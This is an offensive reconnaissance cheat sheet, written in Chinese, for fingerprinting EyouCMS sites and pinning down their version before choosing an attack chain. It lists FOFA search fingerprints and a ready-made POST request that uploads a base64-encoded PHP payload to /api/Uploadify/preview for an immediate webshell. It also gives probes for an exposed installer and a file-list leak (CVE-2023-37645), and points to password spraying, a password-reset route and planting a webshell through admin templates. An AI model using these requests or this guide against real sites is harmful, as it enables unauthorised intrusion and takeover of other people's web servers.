== EyouCMS 版本判定速查（用最少包数定版本区间，再决定打哪条链）==

【判据 0｜0 包】资产侧指纹
  FOFA:        body="EyouCms"  /  title="eyoucms"  /  icon_hash="-614262549"
  Censys:      same
  后台入口恒定: /login.php   （URL 形式 /login.php?m=<app>&c=<controller>&a=<action>）
  后台登录页含验证码特征串 ey_fleshVerify

【判据 1｜1 包，同时判版本 + 可能直接 getshell】★首选
  POST /example.com/api/Uploadify/preview
  Content-Type: text/plain;charset=UTF-8
  body: data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==
   → 返回 {"jsonrpc":"2.0","result":".../preview/<md5>.php"...}  ⇒ 版本 1.0–1.5.1，且前台 getshell 到手
   → 返回 {"jsonrpc":"2.0","error":{"code":100,"message":"un recoginized source"}} ⇒ 接口在（老版），换 payload 形态再试
   → 404 / 首页 / ThinkPHP 异常 ⇒ 接口已废弃（官方 master 构造函数直接 exit;）⇒ 版本 > 1.5.1

【判据 2｜1 包，判 <=1.6.3】
  GET /data/model/custom_model_path/recruit.filelist.txt
   → 200 且 body 同时含 application/admin/ 与 template/pc/  ⇒ 版本 <= 1.6.3
  （nuclei 模板 CVE-2023-37645）

【判据 3｜1 包，判安装状态 / 安装锁是否存在】
  GET /install/example.com
   → 含 "EyouCms" + "/install/example.com?step=2" + "使用协议</p>" ⇒ 安装页裸露（配置缺陷）
   → 含 "你已经安装过该系统，如果想重新安装，请先删除站点install目录下的 install.lock 文件"
       ⇒ 已安装且 install/install.lock 存在（官方 FAQ 原文）
   → 404/403 ⇒ install 目录已删（正常加固）
   ※ install.lock 是空标记文件，价值在"存在性判定"，不在内容；本条目不含任何破坏性重装流程。

【判据 4｜0 包，判后台是否活着 + 模板是否编译】
  GET /login.php
   → 后台登录页（含验证码）⇒ 走口令喷洒 / setpwd.php 重置路线
   → 404 / 首页 ⇒ 后台改名或不可达 ⇒ 放弃"需后台"的链
  首页若原样输出 {eyou:include file="header.htm" /} 等标签 ⇒ ThinkPHP 模板未编译（调试态），
  对"后台模板写马"路线是正向信号。
  ※ 注意：该现象也可能是站长抄 HTML 模板留下的死标签，不足以单独作为"是易优站"的证据。
     真正判指纹要看 /login.php、/install/example.com、静态资源路径与响应头。

【框架版本（可作辅助，非易优版本）】
  core/base.php: define('THINK_VERSION','5.0.24')  ← 全版本一致，不能用来区分易优版本

【判据优先级建议（省包）】
  判据1 → 判据2 → 判据4 → 判据3，最多 4 包即可锁定区间
